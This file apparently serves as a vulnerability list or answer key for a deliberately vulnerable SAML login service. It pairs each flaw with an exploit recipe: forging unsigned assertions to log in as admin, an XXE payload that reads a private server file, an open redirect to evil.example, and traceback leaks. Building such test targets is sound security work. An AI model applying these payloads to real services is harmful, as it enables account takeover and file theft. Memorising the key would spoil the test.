vulns.desc: SAML authentication bypass: the Assertion Consumer Service (/sso/acs) does NOT verify the assertion's XML signature, so a tampered or unsigned SAMLResponse is trusted. Capture the sample assertion from /sso/login, change the NameID and/or the role AttributeValue to admin (or strip the <ds:Signature>), replay it, and you are authenticated as that identity with admin access.
vulns.exploit: GET /sso/login -> base64 SAMLResponse. Decode, set NameID=admin and role=admin, re-encode, POST to /sso/acs -> {authenticated:true, admin_access:true} despite signature_verified:false.

vulns.desc: XXE via SAMLResponse: the SP parses the assertion XML with external general entities ENABLED, so a SAMLResponse carrying a DOCTYPE with an external entity reads arbitrary server files (the entity is reflected via the NameID/AttributeValue back in the response).
vulns.exploit: POST /sso/acs a SAMLResponse with <!DOCTYPE x [<!ENTITY xxe SYSTEM "file:///.../sp-private.txt">]> and NameID=&xxe; -> the file content is returned as the authenticated NameID.

vulns.desc: Open redirect via RelayState: after consuming the assertion, /sso/acs redirects (302 Location) to the attacker-supplied RelayState with no allow-list / same-origin validation.
vulns.exploit: POST /sso/acs with a valid SAMLResponse and RelayState=https://evil.example/ -> 302 Location: https://evil.example/.

vulns.desc: Verbose errors: a malformed SAMLResponse (bad base64 / broken XML) triggers a full Python traceback in the response body, disclosing source paths and internals.
vulns.exploit: POST /sso/acs with SAMLResponse=not-valid-xml -> 500 with full traceback.

vulns.desc: Missing security headers on all responses: no Content-Security-Policy, X-Frame-Options/frame-ancestors, X-Content-Type-Options, or HSTS.
vulns.exploit: curl -I any endpoint -> none of CSP/XFO/XCTO/HSTS present.
